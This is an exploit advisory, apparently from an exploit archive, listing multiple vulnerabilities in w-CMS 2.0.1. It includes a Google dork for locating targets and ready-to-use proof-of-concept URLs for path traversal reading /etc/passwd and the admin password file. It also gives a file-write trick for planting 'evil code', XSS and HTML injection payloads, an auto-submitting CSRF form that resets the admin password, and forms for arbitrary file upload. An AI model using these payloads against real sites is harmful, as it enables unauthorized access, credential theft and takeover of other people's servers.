@@ -1,0 +1,124 @@
++----------------------------------------------------------------------+
+|            ____  _            _           _____ _____                |
+|           |  _ \| |          | |         |_   _|  __ \               |
+|           | |_) | | __ _  ___| | __  _____ | | | |  | |              |
+|           |  _ <| |/ _` |/ __| |/ / |_____|| | | |  | |              |
+|           | |_) | | (_| | (__|   <        _| |_| |__| |              |
+|           |____/|_|\__,_|\___|_|\_\      |_____|_____/               |
+|                                                                      |
+|/********************************************************************\|
+|                                                                      |
+|  [x] Exploit Title: w-CMS 2.0.1 Multiple Vulnerabilities             |
+|  [x] Google Dork: intext:"Powered by w-CMS"                          |
+|  [x] Version    : 2.0.1                                              |
+|  [x] WebSite    : http://w-cms.org/                                  |
+|  [x] Software Link: http://wcms.googlecode.com/files/wcms-2.01.zip   |
+|  [x] Author: Black-ID                                                |
+|  [x] Tested on: Win Xp/7 Linux Uubuntu 10.04                         |
+|  [x] Platform: Php                                                   |
+|  [x] Risk      : High                                                |
++----------------------------------------------------------------------+
+ PoC/Exploit:
+ 
+1.# Local File Disclosure [LFD]
+
+~ [PoC]Http://[victim]/path/?p=../../../../../../boot.ini
+~ [PoC]Http://[victim]/path/index.php?p=../../../../../../boot.ini
+~ [PoC]Http://[victim]/path/?p=../../../../../../etc/passwd
+~ [PoC]Http://[victim]/path/index.php?p=../../../../../../etc/passwd
+# Admin Pass Disclosure
+~ [PoC]Http://[victim]/path/index.php?p=../../password
+
++----------------------------------------------------------------------+
+
+2.# Local File Edit/Write
+~ [PoC]Http://[victim]/admin.php?edit=../../../dz0.php
+
+Just Fill The Text Area With Evil Code (Php) & Click Save
+
++----------------------------------------------------------------------+
+
+3.# Cross Site Scripting (XSS) 
+
+~ [PoC]Http://[victim]/path/?p=<script>alert('Dz0')</script>
+~ [PoC]Http://[victim]/path/index.php?p=<script>alert('Dz0')</script>
+
++----------------------------------------------------------------------+
+
+4.# Html Code Injection
+~ [PoC]Http://[victim]/path/(Guestbook Path)Or(Contact Path)
+You Can Inject Html Code In The text Area
+Exapmle : <H3>Own3d</H3>
+++ You Can Inject Xss Too
+Exapmle : <script>alert('Dz0')</script>
+
++----------------------------------------------------------------------+
+
+5.# Cross Site Request Forgny (CSRF) Admin Change Pass
+
+
+~ [PoC] Inject This Evil Code In Contact Form
+
+<html>
+<head>
+<title>Test</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+
+<SCRIPT LANGUAGE="JavaScript"><!--
+setTimeout('document.test.submit()',0);
+//--></SCRIPT>
+
+</head>
+
+<body>
+<form name="test" id="form1" method="post" action="http://localhost/wcms-2.01/admin.php?settings=password"><!-- Target Site -->
+  <p>
+    <input name="password1" type="text" value="dz0" /><!-- New Password -->
+    <input name="password2" type="text" value="dz0"/><!-- Confirm Password -->
+  </p>
+  <p><input type="submit" name="Change" value="Change" />
+   </p>
+</form>
+</body>
+</html>
+
+
++----------------------------------------------------------------------+
+
+6.# Arbitary File Upload
+~ [PoC]Http://[victim]/admin.php
+
+# Add Folder
+<form action='Http://[victim]/path/admin.php' method='post'><input type='hidden' name='files' value='folders' /><h2>
+	Update Folders</h2><div class='left'>
+				  Folder Name</div>
+				  <div class='right'>
+				  <input name='newfolder' value='' /><br /><input style='width: auto;' class='button' type='submit' value='Add' /></form>
+
+
+# Upload File
+
+<form class='P10' action='Http://[victim]/admin.php' method='post' enctype='multipart/form-data'>
+<input type='hidden' name='files' value='upload' />
+<h2>Upload Files</h2>
+<p><b>Folder:</b> <select name='folder'><option value='Dz'>Dz</option></p><p>
+<div id='settings'>
+<div class='left'>
+<p>Files</p>
+
+</div>
+<div class='right'>
+<input type='file' name='file[]' class='multi' accept='gif|jpg|png|bmp|zip|pdf|txt|doc|docx|xlsx|mp3|swf' /><div class='MultiFile-wrap' id='MultiFile5_wrap'><input style='position: absolute; top: -3000px;' name='' class='multi MultiFile-applied' accept='gif|jpg|png|bmp|zip|pdf|txt|doc|docx|xlsx|mp3|swf' type='file' /><div class='MultiFile-list' id='MultiFile5_wrap_list'></div><div class='MultiFile-label'>
+<input style='width: auto;' class='button' type='submit' value='Upload' />
+</div></div></form>  
+
+
++----------------------------------------------------------------------+
+|       [x] Greetz   : Hidden Pain - Liyan Oz - Kedans Dz - Ddos-Dz    |
+|                                                                      |
+|       BaC.Dz - Killer-Dz - Cyb3r-DZ - Ev!LsCr!pT_Dz - Th3 Viper      |
+|                                                                      |
+|       BLaCk_SPECTRE - Kha&miX - Damane2011 - YaSmouh - ra3ch         |
+|                                                                      |
+|       [x] Special 10x: Sec4Ever.Com - xDZx Team - Is-Sec.Org         |
++----------------------------------------------------------------------+
